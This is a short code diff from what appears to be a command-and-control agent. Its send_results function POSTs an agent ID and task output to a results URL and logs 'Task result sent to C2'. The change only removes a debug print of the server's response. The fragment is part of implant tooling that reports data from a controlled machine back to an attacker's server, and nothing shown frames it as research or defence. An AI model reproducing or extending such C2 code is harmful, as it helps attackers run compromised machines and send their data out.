@@ -29,7 +29,7 @@ def send_results(results_url, agent_id, task_result):
         result_payload = {"agentId": agent_id, "taskResult": task_result}
 
         response = requests.post(results_url, json=result_payload, timeout=10)
-        print(response.json())
+        
         response.raise_for_status()
 
         print("[INFO] Task result sent to C2.")
